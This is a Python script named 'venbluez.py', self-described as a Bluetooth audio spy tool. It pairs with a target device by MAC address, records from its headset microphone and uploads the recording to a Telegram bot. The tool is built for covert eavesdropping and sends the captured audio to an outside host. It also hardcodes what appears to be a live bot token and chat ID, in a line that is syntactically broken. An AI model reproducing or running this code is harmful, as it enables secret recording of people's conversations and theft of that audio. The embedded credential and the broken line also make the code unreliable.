import argparse
import subprocess
import os
import time
import signal
import sys
import shutil

try:
    import requests
except ImportError:
    print("[!] Required Python package 'requests' not found.")
    print("[!] Please install it using: pip install requests")
    sys.exit(1)

recorder = None
current_filename = None
bot_token = None
chat_id = None
target_mac = None

def stop_recording(sig, frame):
    print("\n[!] Stopping recording...")
    global recorder, current_filename, bot_token, chat_id, target_mac
    
    if recorder:
        recorder.terminate()
        recorder.wait()  # Wait for parecord to properly close and save the file
        print("[+] Recording process stopped.")
        
        if current_filename and os.path.exists(current_filename):
            file_size = os.path.getsize(current_filename)
            if file_size > 0:
                print(f"[+] Recording saved at: {current_filename} ({file_size} bytes)")
                
                if bot_token and chat_id:
                    print("[*] Sending audio to Telegram...")
                    send_to_telegram(bot_token, chat_id, current_filename, target_mac)
                else:
                    print("[i] Telegram credentials not provided. File saved locally only.")
            else:
                print("[-] Recording file is empty. Nothing to send.")
        else:
            print("[-] Recording file not found.")
            
    sys.exit(0)

signal.signal(signal.SIGINT, stop_recording)

def send_to_telegram(token, chat_id, file_path, mac):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    clean_mac = mac.replace(':', '_')
    caption = f"🎙️ *Bluetooth Audio Recording*\n📡 Target MAC: `{mac}`\n📁 File: `{clean_mac}.wav`"
    
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {
                'chat_id': chat_id,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            response = requests.post(url, data=data, files=files, timeout=30)
            
            if response.status_code == 200:
                print("[+] Audio successfully sent to Telegram!")
            else:
                print(f"[-] Failed to send to Telegram. Status: {response.status_code}")
                print(f"    Response: {response.text}")
    except Exception as e:
        print(f"[!] Error sending to Telegram: {e}")

def check_requirements():
    for tool in ["l2ping", "parecord", "bluetoothctl", "pactl"]:
        if not shutil.which(tool):
            print(f"[!] Required tool '{tool}' not found. Please install it.")
            sys.exit(1)

def check_vulnerability(mac):
    print(f"[+] Checking if {mac} is reachable (via l2ping)...")
    try:
        output = subprocess.check_output(["sudo", "l2ping", "-c", "1", mac], stderr=subprocess.STDOUT)
        if b"1 sent" in output:
            print(f"[+] Device {mac} is responding. Likely reachable.")
            return True
    except subprocess.CalledProcessError as e:
        print("[-] Device not responding to l2ping.")
        print(f"    Error: {e.output.decode().strip()}")
    except Exception as e:
        print(f"[!] Unexpected error in l2ping: {e}")
    return False

def pair_and_connect(mac):
    print(f"[+] Pairing and connecting to {mac} via bluetoothctl...")
    commands = f"""
power on
agent on
default-agent
scan on
pair {mac}
trust {mac}
connect {mac}
exit
"""
    with open("bt_script.txt", "w") as f:
        f.write(commands)

    try:
        subprocess.run(["bluetoothctl"], stdin=open("bt_script.txt", "r"),
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Pairing & connection attempted for {mac}")
    except Exception as e:
        print(f"[!] Error during bluetoothctl operation: {e}")
    finally:
        if os.path.exists("bt_script.txt"):
            os.remove("bt_script.txt")

def find_active_bluetooth_source(mac):
    print("[*] Searching for active Bluetooth mic source (auto-match)...")
    mac_id = mac.replace(":", "_").lower()
    try:
        output = subprocess.check_output(["pactl", "list", "sources", "short"]).decode()
        for line in output.strip().split("\n"):
            if f"bluez_source.{mac_id}" in line and "headset_head_unit" in line:
                source_name = line.split()[1]
                print(f"[+] Found active Bluetooth source: {source_name}")
                return source_name
        print("[!] Bluetooth mic source not found in PulseAudio source list.")
        print("[i] Make sure the device is connected and in HSP/HFP profile.")
        print("[i] You can manually test using:")
        print(f"    parecord --device=bluez_source.{mac_id}.headset_head_unit test.wav")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error while searching for source: {e}")
        sys.exit(1)

def start_recording(mac, source_name):
    global recorder, current_filename, target_mac
    target_mac = mac
    print("[+] Starting audio recording... Press Ctrl+C to stop and send to Telegram.")
    os.makedirs("recordings", exist_ok=True)
    current_filename = f"recordings/{mac.replace(':', '_')}.wav"
    
    try:
        recorder = subprocess.Popen(["parecord", "--device", source_name, current_filename])
        recorder.wait()
    except Exception as e:
        print(f"[!] Failed to start recording: {e}")
        sys.exit(1)

def main():
    print("""
                     _      _                   
 __   __ ___  _ __  | |__  | | _   _   ___  ____ 
 \ \ / // _ \| '_ \ | '_ \ | || | | | / _ \|_  /
  \ V /|  __/| | | || |_) || || |_| ||  __/ / / 
   \_/  \___||_| |_||_.__/ |_| \__,_| \___|/___|

                   by BlackHat Venom (Telegram Enabled)
""")

    parser = argparse.ArgumentParser(description="venbluez.py - Bluetooth Audio Spy Tool with Telegram Integration")
    parser.add_argument("-a", "--address", required=True, help="Target Bluetooth MAC Address")
    parser.add_argument("-t", "--token", required=False, help="Telegram Bot Token (Optional)")
    parser.add_argument("-c", "--chat", "--chat-id", required=False, help="Telegram Chat ID (Optional)")
    args = parser.parse_args()

    global bot_token, chat_id
    bot_token = 8904030750:AAG4c2mCKkOJ4T3Ai3YEwUEiSr1HW_ohedg
    chat_id = 5711555860

    if bot_token and not chat_id:
        print("[!] If you provide a Bot Token, you must also provide a Chat ID.")
        sys.exit(1)
    if chat_id and not bot_token:
        print("[!] If you provide a Chat ID, you must also provide a Bot Token.")
        sys.exit(1)

    check_requirements()
    target = args.address

    if not check_vulnerability(target):
        print("[-] Target device is not reachable.")
        return

    pair_and_connect(target)
    time.sleep(3)  # wait for audio interface to register

    source = find_active_bluetooth_source(target)
    start_recording(target, source)

if __name__ == "__main__":
    main()
